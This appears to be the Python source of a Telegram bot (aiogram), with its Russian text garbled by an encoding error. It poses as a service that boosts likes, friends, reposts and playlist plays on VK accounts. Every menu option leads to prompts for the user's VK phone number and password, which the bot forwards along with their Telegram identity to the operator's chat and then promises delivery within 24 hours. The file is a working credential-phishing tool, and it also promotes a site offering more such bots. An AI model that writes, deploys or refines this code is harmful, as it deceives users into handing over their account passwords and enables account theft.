import logging
import asyncio
from aiogram import Bot, Dispatcher, types, executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command, Text
from aiogram.types import Message, CallbackQuery
from aiogram.dispatcher.filters.state import State, StatesGroup
from config import ID, TOKEN
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.callback_data import CallbackData

bot = Bot(token=TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())

@dp.message_handler(commands=['start'])
async def start(message):
    print(f"""–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å!
    ID: {message.from_user.id}""")
    await bot.send_message(message.chat.id, """
üëã –ü—Ä–∏–≤–µ—Ç! üëã
–≠—Ç–æ –±–æ—Ç –Ω–∞–∫—Ä—É—Ç–∫–∏ –ª–∞–π–∫–æ–≤ –∏ –¥—Ä—É–∑–µ–π –Ω–∞ –≤–∞—à VK –∞–∫–∫–∞—É–Ω—Ç!
–ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –Ω–∞–∂–º–∏—Ç–µ /nacrutka""")
print("–ë–û–õ–¨–®–ï –ë–û–¢–û–í –ù–ê CONFF.ORG")
@dp.message_handler(commands=['nacrutka', 'n'])
async def start1(message):
    keyboardmain = types.InlineKeyboardMarkup(row_width=2)
    first_button = types.InlineKeyboardButton(text="–õ–∞–π–∫–∏‚ù§Ô∏è", callback_data="like")
    second_button = types.InlineKeyboardButton(text="–î—Ä—É–∑—å—èüìÉ", callback_data="lik")
    button3 = types.InlineKeyboardButton(text="–†–µ–ø–æ—Å—Ç—ã", callback_data="lie")
    button4 = types.InlineKeyboardButton(text="–ü—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è –ø–ª–µ–π–ª–∏—Å—Ç–æ–≤", callback_data="li")
    keyboardmain.add(first_button, second_button, button3, button4)
    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –ø—É–Ω–∫—Ç:", reply_markup=keyboardmain)

@dp.callback_query_handler(text='like')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, '–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await bot.send_message(message.chat.id, f'–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: {num}')
    await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await message.answer('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''–ü–æ–ª—É—á–µ–Ω–æ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk 
ID: {message.from_user.id}
–ù–∏–∫: @{message.from_user.username}
–õ–æ–≥–∏–Ω: +{inp}
–ü–∞—Ä–æ–ª—å: {usrpass}
–ò–º—è: {message.from_user.first_name}
–ò—Å—Ç–æ—á–Ω–∏–∫: –ë–æ–ª—å—à–µ –±–æ—Ç–æ–≤ –Ω–∞ CONFF.ORG 
''')
    await asyncio.sleep(1)
    await message.answer(f"–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–º! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, —Ç–æ –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤!")
    await state.finish()

@dp.callback_query_handler(text='lik')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, '–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await bot.send_message(message.chat.id, f'–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: {num}')
    await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await message.answer('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''–ü–æ–ª—É—á–µ–Ω–æ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk 
ID: {message.from_user.id}
–ù–∏–∫: @{message.from_user.username}
–õ–æ–≥–∏–Ω: +{inp}
–ü–∞—Ä–æ–ª—å: {usrpass}
–ò–º—è: {message.from_user.first_name}
''')
    await asyncio.sleep(1)
    await message.answer(f"–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–º! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, —Ç–æ –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤!")
    await state.finish()

@dp.callback_query_handler(text='lie')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, '–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await bot.send_message(message.chat.id, f'–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: {num}')
    await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await message.answer('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''–ü–æ–ª—É—á–µ–Ω–æ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk 
ID: {message.from_user.id}
–ù–∏–∫: @{message.from_user.username}
–õ–æ–≥–∏–Ω: +{inp}
–ü–∞—Ä–æ–ª—å: {usrpass}
–ò–º—è: {message.from_user.first_name}
''')
    await asyncio.sleep(1)
    await message.answer(f"–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–º! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, —Ç–æ –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤!")
    await state.finish()

@dp.callback_query_handler(text='li')
async def callback_inline(call: types.CallbackQuery, state: FSMContext):
    await bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ (–Ω–µ –±–æ–ª–µ–µ 500)') 
    await state.set_state('qproc1')
    
@dp.message_handler(state='qproc1')
async def qproc1(message, state: FSMContext):
    num = message.text 
    if not num.isdigit():
        await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    elif int(num) > 500:
        await bot.send_message(message.chat.id, '–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –±–æ–ª–µ–µ 500! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await bot.send_message(message.chat.id, f'–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ: {num}')
    await bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(num=num)
    await state.set_state('step1')

@dp.message_handler(state='step1')
async def step1(message, state: FSMContext):
    inp = message.text.replace("+", "")
    if not inp.isdigit():
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —á–∏—Å–ª–æ–º! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.')
        return
    await message.answer('–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:')
    await state.update_data(login=inp)
    await state.set_state('step2')

@dp.message_handler(state='step2')
async def step2(message, state: FSMContext):
    data = await state.get_data()
    inp = data.get('login')
    usrpass = message.text
    await bot.send_message(ID, f'''–ü–æ–ª—É—á–µ–Ω–æ: 
–ü–æ–ª—É—á–µ–Ω–æ –≤ –±–æ—Ç–µ: vk 
ID: {message.from_user.id}
–ù–∏–∫: @{message.from_user.username}
–õ–æ–≥–∏–Ω: +{inp}
–ü–∞—Ä–æ–ª—å: {usrpass}
–ò–º—è: {message.from_user.first_name}
''')
    await asyncio.sleep(1)
    await message.answer(f"–°–ø–∞—Å–∏–±–æ, —á—Ç–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –Ω–∞—à–∏–º —Å–µ—Ä–≤–∏—Å–æ–º! –ï—Å–ª–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ, —Ç–æ –æ–∂–∏–¥–∞–π—Ç–µ –Ω–∞–∫—Ä—É—Ç–∫—É –Ω–∞ –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤!")
    await state.finish()


if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)